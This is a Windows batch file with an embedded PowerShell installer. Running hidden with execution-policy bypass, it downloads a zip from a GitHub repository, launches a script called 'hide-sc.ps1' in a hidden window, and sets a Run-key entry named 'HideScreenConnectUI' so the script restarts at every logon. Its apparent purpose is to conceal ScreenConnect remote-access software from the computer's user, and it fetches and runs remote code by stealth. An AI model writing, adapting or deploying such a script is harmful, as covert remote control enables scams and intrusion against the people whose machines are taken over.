@echo off
if /I "%~1"=="uninstall" goto :uninstall
if /I not "%~1"=="_" (
    start "" /min cmd /c ""%~f0" _"
    exit /b 0
)

set "BATCH_SELF=%~f0"
set "LOCAL_ZIP=%~dp0hide-sc.zip"
set "INSTALLER=%TEMP%\sc_hide_install.ps1"
set "PS=%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe"

"%PS%" -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "try { $raw = Get-Content -LiteralPath $env:BATCH_SELF -Raw; if ($raw -notmatch '(?ms)^#PS1#\r?\n(.*\S)\s*$') { exit 1 }; $Matches[1] | Out-File -LiteralPath $env:INSTALLER -Encoding UTF8 -Force } catch { exit 1 }" >nul 2>&1
if errorlevel 1 exit /b 1

"%PS%" -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "%INSTALLER%" >nul 2>&1
exit /b %errorlevel%

:uninstall
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "HideScreenConnectUI" /f >nul 2>&1
for /f "tokens=2" %%a in ('tasklist /FI "IMAGENAME eq powershell.exe" /FO LIST 2^>nul ^| find "PID:"') do (
    wmic process where "ProcessId=%%a" get CommandLine 2>nul | find "hide-sc.ps1" >nul && taskkill /PID %%a /F >nul 2>&1
)
if exist "%LOCALAPPDATA%\hide" rmdir /s /q "%LOCALAPPDATA%\hide" >nul 2>&1
if exist "%SystemRoot%\System32\hide" rmdir /s /q "%SystemRoot%\System32\hide" >nul 2>&1
exit /b 0

#PS1#
$ErrorActionPreference = 'Stop'

$installDir = Join-Path $env:LOCALAPPDATA 'hide'
$scriptPath = Join-Path $installDir 'hide-sc.ps1'
$psExe      = Join-Path $env:SystemRoot 'System32\WindowsPowerShell\v1.0\powershell.exe'
$localZip   = $env:LOCAL_ZIP

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

New-Item -ItemType Directory -Path $installDir -Force | Out-Null

if ($localZip -and (Test-Path -LiteralPath $localZip)) {
    if (Test-Path -LiteralPath $installDir) {
        Get-ChildItem -LiteralPath $installDir | Remove-Item -Recurse -Force
    }
    Expand-Archive -LiteralPath $localZip -DestinationPath $installDir -Force
}
else {
    $zipFile  = Join-Path $env:TEMP 'hide-github.zip'
    $staging  = Join-Path $env:TEMP 'hidezip-main'
    $innerZip = Join-Path $staging 'hide-sc.zip'
    $repoUrl  = 'https://github.com/chanelwolthuis-del/hidezip/archive/refs/heads/main.zip'

    Invoke-WebRequest -Uri $repoUrl -OutFile $zipFile -UseBasicParsing

    if (Test-Path -LiteralPath $staging) {
        Remove-Item -LiteralPath $staging -Recurse -Force
    }

    Expand-Archive -LiteralPath $zipFile -DestinationPath $env:TEMP -Force

    if (Test-Path -LiteralPath $installDir) {
        Get-ChildItem -LiteralPath $installDir | Remove-Item -Recurse -Force
    }

    Expand-Archive -LiteralPath $innerZip -DestinationPath $installDir -Force
}

if (-not (Test-Path -LiteralPath $scriptPath)) {
    exit 1
}

Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
    Where-Object { $_.CommandLine -like '*hide-sc.ps1*' } |
    ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }

Start-Process -FilePath $psExe -ArgumentList @(
    '-NoProfile', '-WindowStyle', 'Hidden', '-ExecutionPolicy', 'Bypass', '-File', $scriptPath
) -WindowStyle Hidden

$runValue = "`"$psExe`" -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'HideScreenConnectUI' -Value $runValue -Force

exit 0
